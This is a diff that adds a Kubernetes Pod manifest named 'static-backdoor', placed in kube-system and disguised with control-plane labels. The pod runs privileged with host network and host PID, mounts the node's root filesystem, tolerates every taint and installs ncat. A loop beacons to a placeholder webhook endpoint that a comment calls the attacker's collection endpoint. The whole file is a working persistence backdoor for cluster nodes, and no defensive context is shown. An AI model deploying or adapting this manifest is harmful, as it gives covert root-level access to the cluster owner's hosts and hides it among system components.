@@ -1,0 +1,40 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: static-backdoor
+  namespace: kube-system
+  labels:
+    app: static-backdoor
+    tier: control-plane
+spec:
+  hostNetwork: true
+  hostPID: true
+  containers:
+    - name: backdoor
+      image: alpine:latest
+      command: ["/bin/sh", "-c"]
+      args:
+        - |
+          apk add --no-cache curl ncat 2>/dev/null
+          while true; do
+            # Beacon to attacker's collection endpoint every 60 seconds
+            curl -sf -m 5 -X POST \
+              -H "Content-Type: text/plain" \
+              --data "static-backdoor alive on $(hostname)" \
+              https://webhook.site/YOUR_WEBHOOK_ID 2>/dev/null || true
+            sleep 60
+          done
+      securityContext:
+        privileged: true
+      volumeMounts:
+        - name: host-root
+          mountPath: /host
+  volumes:
+    - name: host-root
+      hostPath:
+        path: /
+  tolerations:
+    - effect: NoSchedule
+      operator: Exists
+    - effect: NoExecute
+      operator: Exists
